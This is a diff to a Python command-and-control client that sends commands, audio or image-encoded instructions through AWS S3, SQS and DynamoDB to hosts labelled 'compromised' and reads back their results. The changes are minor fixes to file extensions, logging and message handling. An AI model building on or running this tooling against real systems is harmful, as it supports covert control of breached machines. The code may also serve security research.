@@ -82,6 +82,7 @@ def main(args):
             voice.audioPath = input()
             cmdProcessing.mimeType = 'audio/wav'
             voice.audioDirectory()
+            cmdProcessing.extension = 'wav'
         else:
             # Calls initFile to create the image
             cmdProcessing.createImage(command)
@@ -103,6 +104,7 @@ def main(args):
 
             # Set the Key for the bucket and call the function
             bucket.bucketKey = 'compromised/' + bucket.bucketName + '/sendCommand/' + str(time.time()) + '.' + cmdProcessing.extension
+            print(bucket.bucketKey)
             if 'voice' in command or 'audio' in command:
                 splitMime = cmdProcessing.mimeType.split('/')
                 bucket.postBucketCommand(voice.result.get_wav_data(), splitMime[0])
@@ -139,7 +141,7 @@ def main(args):
 
                 # Check if the dynamo flag is set
                 if args.d == True:
-                    dynamo.getTable(bucket.bucketName, command, args)
+                    dynamo.getTable(bucket.bucketName, sqs.messageAction, args)
                 
                 if args.o == True:
                     cmdProcessing.writeFile(dynamo.currentTime, 'outImages')
@@ -474,6 +476,7 @@ class sqsFunctions:
         self.message = message
         self.messageAmount = messageAmount
         self.messageExist = messageExist
+        self.messageAction = ""
 
     def getUrl(self, hostname):
         # Get the URL of the compromised host
@@ -507,6 +510,7 @@ class sqsFunctions:
         try:
             self.receiptHandle = result['Messages'][0]['ReceiptHandle']
             self.message = result['Messages'][0]['MessageAttributes']['Path']['StringValue']
+            self.messageAction = result['Messages'][0]['MessageAttributes']['Action']['StringValue']
             self.messageExist = True
             self.deleteMessage()  
         except:
@@ -541,8 +545,8 @@ class dynamoFunction():
         try:
             print('Dynamo Entry:\n',response['Items'][0]['result']['S'])
             self.currentTime = float(response['Items'][0]['commandTime']['N'])
-        except:
-            print('Dynamo Entry: Error occurred...')
+        except Exception as e:
+            print(e)
             self.currentTime = time.time()
         
         if args.de == True:
